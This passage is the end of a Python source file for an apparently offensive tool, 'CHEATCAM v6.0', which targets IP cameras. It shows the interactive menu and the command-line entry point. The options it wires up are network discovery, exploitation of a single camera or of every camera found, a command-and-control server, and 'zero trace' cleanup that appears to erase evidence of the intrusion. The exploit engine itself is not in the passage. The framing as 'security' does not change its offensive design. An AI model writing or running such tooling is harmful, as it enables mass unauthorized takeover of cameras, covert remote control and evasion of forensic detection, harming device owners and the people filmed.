            elif choice == '10':
                self.zero_trace()
            elif choice == '11':
                cprint("[*] Exiting...", Colors.GREEN)
                if self.c2:
                    self.c2.stop()
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

#===============================================================================
# MAIN
#===============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="CHEATCAM v6.0 - Ultimate IP Camera Security",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 cheatcam_v6.py --discover
  python3 cheatcam_v6.py --exploit --target 192.168.1.100
  python3 cheatcam_v6.py --exploit-all
  python3 cheatcam_v6.py --c2-start
  python3 cheatcam_v6.py --zero-trace
        """
    )
    
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    parser.add_argument("--discover", action="store_true", help="Discover only")
    parser.add_argument("--exploit", help="Exploit specific camera IP")
    parser.add_argument("--exploit-all", action="store_true", help="Exploit all cameras")
    parser.add_argument("--c2-start", action="store_true", help="Start C2 server")
    parser.add_argument("--zero-trace", action="store_true", help="Zero trace cleanup")
    parser.add_argument("--report", action="store_true", help="Generate report")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        cprint("[!] Root privileges required", Colors.RED)
        sys.exit(1)
    
    tool = CheatCamUltimateV6(args.interface)
    
    if args.discover:
        tool.discover()
        tool.show_cameras()
        sys.exit(0)
    
    if args.exploit:
        tool.discover()
        for cam in tool.cameras:
            if cam.ip == args.exploit:
                exploit = AdvancedExploitEngineV6(cam, tool.zero_trace)
                result = exploit.exploit_all()
                tool.results.append(result)
                break
        sys.exit(0)
    
    if args.exploit_all:
        tool.discover()
        tool.exploit_all()
        sys.exit(0)
    
    if args.c2_start:
        tool.c2.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            tool.c2.stop()
        sys.exit(0)
    
    if args.zero_trace:
        tool.zero_trace()
        sys.exit(0)
    
    if args.report:
        tool.generate_report()
        sys.exit(0)
    
    tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
